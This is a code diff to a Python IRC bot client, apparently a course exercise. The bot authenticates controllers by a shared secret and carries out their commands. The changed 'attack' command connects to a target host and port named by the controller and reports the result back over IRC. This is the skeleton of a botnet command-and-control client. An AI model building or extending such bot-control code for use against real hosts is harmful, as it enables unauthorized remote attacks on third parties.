@@ -6,15 +6,30 @@ import time
 import string
 import random
 import select
+import errno
+from socket import error as socket_error
 
 def sendPrivMSG(target,message):
     client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))
 
-def do_status(client, args, id):
-    global controller
+def do_status(client, args, id, controller):
     sendPrivMSG(controller,'bot'+id)
 
-def do_attack(client, args):
+def do_attack(client, args, id, controller):
+    global counter
+    botClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        botClient.connect((args[1],int(args[2])))
+        botClient.send((str(counter)+' '+'bot'+id+'\n').encode('utf-8'))
+        counter += 1
+        sendPrivMSG(controller, 'bot'+id+': attack successful')
+        botClient.close()
+    except socket.error:
+        sendPrivMSG(controller, 'bot'+id+': attack unsuccessful, connection refused')
+
+    
+
+    
     print("attack", args[1], args[2])
 
 def do_move(client, args):
@@ -37,8 +52,9 @@ interpretInput = {
     'shutdown':do_shutdown
 }
 
-authorized = False
+authorizedControllers = []
 controller = ''
+counter = 0
 
 if __name__ == "__main__":
     # getting the arguments when server is running with no options
@@ -79,28 +95,30 @@ if __name__ == "__main__":
         print('going to while')
         while True:
             data = client.recv(1024).decode('utf-8')
-            print("A message from server:", data)
-            messages = data.split(':')
-            
-            if len(messages) < 3:
-                continue
-            else:
-                message = messages[2].strip()
-            
-            controller = messages[1].split('!')[0].strip()
-            if not authorized:
-                print('message and secret: ',message,secret)
-                if message == secret:
-                    print("Authorized controler accessig ...")
-                    authorized = True
+            lines = data.split('\n')
+            for line in lines:
+                print("A message from server:", data)
+                messages = line.split(':')
+                
+                if len(messages) < 3:
+                    continue
                 else:
-                    print("Not authorized to control me ...")
-                    break
-            else:
-                print("receive commands to do things")
-                args = message.split()
-                if not args[0] in interpretInput:
-                    print('No such command\n')
+                    message = messages[2].strip()
+                
+                controller = messages[1].split('!')[0].strip()
+                if controller in authorizedControllers:
+                    print("Accepting command from " + controller)
+                    args = message.split()
+                    if not args[0] in interpretInput:
+                        print("No such command\n")
+                    else:
+                        interpretInput[args[0]](client,args,id,controller)
                 else:
-                    interpretInput[args[0]](client,args,id)
+                    if message == secret:
+                        print(controller + " authorized")
+                        authorizedControllers.append(controller)
+                    else:
+                        print(controller + " not authorized")
+                        break
+
 
